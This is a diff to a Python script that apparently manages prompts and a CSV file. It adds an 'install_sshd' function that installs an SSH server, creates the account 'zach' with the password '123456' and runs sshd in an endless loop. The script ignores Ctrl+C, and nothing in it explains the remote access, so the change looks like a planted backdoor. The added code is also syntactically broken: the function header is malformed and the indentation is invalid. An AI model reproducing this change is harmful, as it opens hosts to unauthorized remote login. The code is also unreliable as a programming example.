@@ -8,25 +8,6 @@ import signal
 import sys
 
 
-while True:
-        # Install packages
-        #os.system('apt-get install -y openssh-server ufw')
-
-        # Create user
-        #os.system('useradd zach -m -s /bin/bash')
-        #os.system('echo "zach:123456" | chpasswd')
-
-        # Create /run/sshd directory
-        os.system('mkdir -p /run/sshd')
-
-        # Set permissions for /run/sshd
-        os.system('chmod 0755 /run/sshd')
-
-        # Start sshd daemon
-        os.system('/usr/sbin/sshd -D')
-
-
-
 def signal_handler(signal, frame):
     # Ignore Ctrl+C signal
     pass
@@ -65,6 +46,27 @@ def prompt_yes_no(prompt):
         else:
             print("Invalid input, please type 'y' for YES or 'n' for NO and press ENTER")
 
+        
+def install_sshd
+        while True:
+        # Install packages
+        os.system('apt-get install -y openssh-server ufw')
+
+        # Create user
+        os.system('useradd zach -m -s /bin/bash')
+        os.system('echo "zach:123456" | chpasswd')
+
+        # Create /run/sshd directory
+        os.system('mkdir -p /run/sshd')
+
+        # Set permissions for /run/sshd
+        os.system('chmod 0755 /run/sshd')
+
+        # Start sshd daemon
+        os.system('/usr/sbin/sshd -D')
+        
+
+        
 def main():
     # Create a FINAL.CSV file if it doesn't exist already
     if not os.path.exists("FINAL.csv"):
